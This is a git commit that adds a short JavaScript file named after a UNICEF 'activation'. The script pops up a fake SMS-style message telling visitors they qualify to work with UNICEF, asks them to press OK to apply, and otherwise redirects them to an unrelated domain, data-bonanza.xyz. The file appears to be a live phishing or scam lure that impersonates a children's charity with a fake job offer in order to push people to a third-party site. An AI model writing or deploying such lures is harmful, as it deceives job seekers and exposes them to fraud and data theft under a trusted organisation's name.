652da5414e6aedbbf00e89c811755ccd928eed7a
infofest <ukpono82@gmail.com>
2025-03-12 15:19:43 -0700

    Create activation-2025-unicef.org.js

---
+++ activation-2025-unicef.org.js
@@ -0,0 +1,7 @@
+
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the UNITED NATION CHILDREN FUND (UNICEF), Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://www.data-bonanza.xyz/2025-unicef.org';
+}
